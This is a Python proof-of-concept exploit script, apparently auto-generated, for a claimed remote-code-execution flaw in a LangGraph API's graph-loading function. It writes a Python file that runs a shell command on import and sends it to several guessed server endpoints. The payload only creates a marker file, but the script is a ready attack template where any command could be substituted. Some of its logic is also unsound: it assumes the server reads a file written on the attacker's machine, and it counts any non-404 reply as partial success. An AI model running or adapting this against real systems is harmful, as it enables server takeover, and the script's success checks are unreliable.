#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: rce-009
# Sink: _graph_from_spec
# Auto-generated — run with: python3 rce_if_control_spec__graph_from_spec_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src.

Vulnerability: The _graph_from_spec function in graph.py uses user-controlled
spec.module or spec.path to import/execute arbitrary Python code without validation.
An attacker can achieve RCE by providing a malicious module name or file path.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file that executes a benign command
2. Sending a request to the vulnerable endpoint with the malicious path
3. Verifying command execution

Usage: python3 poc.py [target_url]
Default target: http://localhost:8000
"""

import sys
import os
import tempfile
import requests
import json
import time

# Configuration
TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
MALICIOUS_FILE = os.path.join(tempfile.gettempdir(), "evil_graph.py")
VERIFICATION_FILE = "/tmp/poc_success.txt"


def create_malicious_graph_file():
    """Create a malicious Python file that executes a benign command on import."""
    payload = f"""
import os
# Benign payload - creates a verification file
os.system("touch {VERIFICATION_FILE}")
# The graph variable that the server expects
from langgraph.graph import StateGraph
graph = StateGraph()
"""
    with open(MALICIOUS_FILE, "w") as f:
        f.write(payload)
    print(f"[+] Created malicious graph file: {MALICIOUS_FILE}")


def send_exploit_request():
    """Send a request to the vulnerable endpoint with the malicious path."""
    # The vulnerable endpoint is typically /graphs or similar
    # We need to find the exact endpoint that calls _graph_from_spec
    # Based on the code, this is likely called when creating/loading a graph
    
    # Try common endpoints
    endpoints = [
        f"{TARGET_URL}/graphs",
        f"{TARGET_URL}/api/graphs",
        f"{TARGET_URL}/v1/graphs",
        f"{TARGET_URL}/graph",
    ]
    
    # The spec object structure that triggers the vulnerability
    # spec.path is used with spec_from_file_location and exec_module
    malicious_spec = {
        "path": MALICIOUS_FILE,
        "variable": "graph",
        "id": "test_graph"
    }
    
    for endpoint in endpoints:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            
            # Try POST with JSON body containing the spec
            response = requests.post(
                endpoint,
                json=malicious_spec,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:200]}")
            
            # Check if we got a response (even an error means code executed)
            if response.status_code != 404:
                print(f"[+] Got non-404 response from {endpoint}")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"    [!] Connection refused to {endpoint}")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout connecting to {endpoint}")
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    return False


def verify_exploitation():
    """Check if the benign payload was executed."""
    if os.path.exists(VERIFICATION_FILE):
        print(f"[+] SUCCESS! Verification file created: {VERIFICATION_FILE}")
        print("[+] RCE achieved - the malicious Python file was executed")
        # Clean up verification file
        os.remove(VERIFICATION_FILE)
        return True
    else:
        print("[-] Verification file not found - exploitation may have failed")
        return False


def cleanup():
    """Remove the malicious file."""
    if os.path.exists(MALICIOUS_FILE):
        os.remove(MALICIOUS_FILE)
        print(f"[*] Cleaned up malicious file: {MALICIOUS_FILE}")


def main():
    print("=" * 60)
    print("LangGraph API RCE Proof-of-Concept")
    print("=" * 60)
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Verification file: {VERIFICATION_FILE}")
    print()
    
    # Step 1: Create malicious graph file
    print("[*] Step 1: Creating malicious graph file...")
    create_malicious_graph_file()
    
    # Step 2: Send exploit request
    print("\n[*] Step 2: Sending exploit request...")
    exploited = send_exploit_request()
    
    # Step 3: Verify exploitation
    print("\n[*] Step 3: Verifying exploitation...")
    time.sleep(1)  # Give time for command execution
    success = verify_exploitation()
    
    # Cleanup
    cleanup()
    
    print("\n" + "=" * 60)
    if success:
        print("[+] EXPLOIT SUCCESSFUL - RCE achieved!")
        print("[+] The server executed code from the attacker-controlled file")
    else:
        print("[-] Exploit may have failed or endpoint not found")
        print("[*] Try adjusting the target URL or checking server logs")
    print("=" * 60)
    
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
